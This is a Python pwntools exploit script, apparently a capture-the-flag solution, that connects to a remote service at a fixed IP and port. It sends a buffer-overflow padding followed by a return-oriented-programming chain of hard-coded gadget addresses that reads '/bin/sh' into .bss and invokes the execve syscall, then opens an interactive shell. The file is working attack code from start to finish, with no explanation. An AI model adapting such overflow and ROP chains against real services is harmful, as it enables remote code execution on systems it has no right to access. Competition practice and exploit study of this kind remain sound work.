from pwn import *

token = input('input token:')
io = remote('202.38.93.111','10141')
print(io.recv())
io.send(token + '\n')

padding = b'(1,1)' + ('c' * 147).encode()

pop_rdi_ret = 0x4017b6
pop_rax_ret = 0x43e52c
pop_rsi_ret = 0x407228
pop_rdx_ret = 0x43dbb5
gets_addr = 0x409e00
syscall = 0x402bf4
bss_addr = 0x4a69b0

payload = padding
payload += p64(pop_rdi_ret) + p64(bss_addr)
payload += p64(gets_addr)
payload += p64(pop_rax_ret) + p64(0x3b)         # rax 0x3b
payload += p64(pop_rdi_ret) + p64(bss_addr)     # rdi /bin/sh
payload += p64(pop_rsi_ret) + p64(0)            # rsi NULL 0
payload += p64(pop_rdx_ret) + p64(0)            # rdx NULL 0
payload += p64(syscall)
payload += p64(0) * 4

io.recvuntil(b'1): ')

io.sendline(payload)

io.recvuntil(b'1): ')

io.sendline('(0,2)')

io.recvuntil(b'1): ')

io.sendline('(2,2)')

io.recvuntil(b'time~')

io.send('/bin/sh\x00')

io.interactive()

